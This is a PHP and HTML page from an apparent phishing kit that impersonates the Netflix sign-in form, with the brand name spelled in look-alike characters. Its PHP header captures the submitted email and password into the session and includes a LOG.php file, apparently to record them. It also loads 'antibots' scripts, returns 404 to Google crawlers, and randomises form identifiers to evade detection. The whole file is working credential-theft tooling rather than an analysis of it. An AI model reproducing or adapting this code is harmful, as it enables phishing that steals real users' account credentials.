<?php
session_start();
error_reporting(0);
##################### SECOND FILES #####################
include('../../../RGN/functions/get_lang_en.php'); 
################## ACCOUNT INFORMATION #################
$_SESSION['_login_email_']    = $_POST['login_email'];
$_SESSION['_login_password_'] = $_POST['login_password'];
################## ACCOUNT INFORMATION #################
if(filter_var($_POST['login_email'], FILTER_VALIDATE_EMAIL)){  
    include('LOG.php');
}
$charSet = "XXXXID0123456789";
$charSetSize = strlen($charSet); $pwdSize = 6;
for ($i = 0; $i < $pwdSize; $i++) {
  $XXX_03 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];
  $XXX_04 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];
  $XXX_05 .= $charSet[ rand( 9, strlen($charSetSize) - 1 ) ];
  $XXX_06 .= $charSet[ rand( 5, strlen($charSetSize) - 1 ) ];
}

 $Z118xF0rm3XX = $XXX_03.mt_rand();
 $x87Z_E54IlsXX = $XXX_04.mt_rand();
 $Zx987P4ss0WrD = $XXX_05.mt_rand();
 $GrimmDZEBI987 = $XXX_06.mt_rand();
//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
include "../../../BOTS/antibots1.php";
include "../../../BOTS/antibots2.php";
include "../../../BOTS/antibots3.php";
include "../../../BOTS/antibots4.php";
include "../../../BOTS/antibots5.php";
include "../../../BOTS/antibots6.php";
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>
<!DOCTYPE html> <html lang="en" class="no-js desktop">

<head>
<title><?=$Z118_01;?></title>
<meta content="" name="keywords">
<meta content="" name="description">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<link type="text/css" rel="stylesheet" href="../../../RGN/lib/css/z.css">
<link type="text/css" rel="stylesheet" href="../../../RGN/lib/css/a.css">
<link rel="shortcut icon" type="image/x-icon" href="../../../RGN/lib/img/favicon.ico">

</head>
<body>
<div id="appMountPoint">
<div class="login-wrapper" data-reactid=".n04xqojxfk" data-react-checksum="-290266296">
<div class="nfHeader login-header signupBasicHeader" data-reactid=".n04xqojxfk.0">
<a href="#" class="icon-logoUpdate nfLogo signupBasicHeader" data-reactid=".n04xqojxfk.0.1">
<span class="screen-reader-text" data-reactid=".n04xqojxfk.0.1.0">Νеtflіx</span></a>
</div>

<div class="login-body" data-reactid=".2app2tcssn4.1">
<div class="login-content login-form" data-reactid=".2app2tcssn4.1.0">
<h1 data-reactid=".2app2tcssn4.1.0.0">Sign In</h1>



<form for="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" action="" method="post" class="<?="_x987WW-".rand(312254, 8754456)?> <?="_x1989MPZ-".rand(31225346854, 8754456)?>" id="<?=$Z118xF0rm3XX;?>" name="login">

<label class="login-input login-input-email ui-label ui-input-label">
<span class="ui-label-text">Email</span>
<input for="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="ui-text-input" name="login_email" type="email" placeholder="<?=$Z118_02;?>" id="email" value="<?php if(isset($_SESSION['_login_email_'])){ echo $_SESSION['_login_email_'];} ?>">
</label>

<label class="login-input login-input-password ui-label ui-input-label">
<span class="ui-label-text">Password</span>
<input for="<?=rand(12390, 8756)."-xMARVELxDCxCOMIC".rand(18, 18)."x-".rand(12390, 8756)?>" class="ui-text-input" name="login_password" type="password" placeholder="<?=$Z118_03;?>" id="password">
<br><br>
<div class="login-forgot-password-wrapper"><a href="#" tabindex="3"> Forgot your email or password? </a>
</div>
<button class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="0">
<spa>Sign In</span></button>
<div class="login-remember-me-wrapper" data-reactid="27"><div class="ui-binary-input login-remember-me" data-reactid="28"><input type="checkbox" class="" name="rememberMe" id="bxid_rememberMe_true" value="true" tabindex="5" data-reactid="29" checked=""><label for="bxid_rememberMe_true" data-reactid="30"><span class="login-remember-me-label-text" data-reactid="31">Remember me</span></label><div class="helper" data-reactid="32"></div></div></div>
</form>
<hr data-reactid="43">



<div class="login-signup-now">
<br />
<span>New to Νеtflіx? </span>

<a class=" " target="_self" href="#">Sign up now</a>
<span>.</span>
</div>
</div>
</div>

<div class="site-footer-wrapper login-footer">
<div class="footer-divider">
</div>

<div class="site-footer">
<p class="footer-top">
<a class="footer-top-a" href="#">Questions? Contact us.</a></p>
<ul class="footer-links structural">

<li class="footer-link-item">
<a class="footer-link" href="#">
<span>Gift Card Terms</span></a>
</li>

<li class="footer-link-item">
<a class="footer-link" href="#">
<span>Terms of Use</span>
</a>
</li>

<li class="footer-link-item">
<a class="footer-link" href="#">
<span>Privacy Statement</span></a>
</li>
</ul>

<div class="lang-selection-container" id="lang-switcher">
<div class="ui-select-wrapper">


<div class="select-arrow medium prefix globe">
<select class="ui-select medium" tabindex="0">
<option value="#">English</option>
</select>
</div>


</div>
</div>
<p class="copy-text"</p>
</div>
</div>
</div>
</div>

</body>


</html>
<?php ob_end_flush(); ?>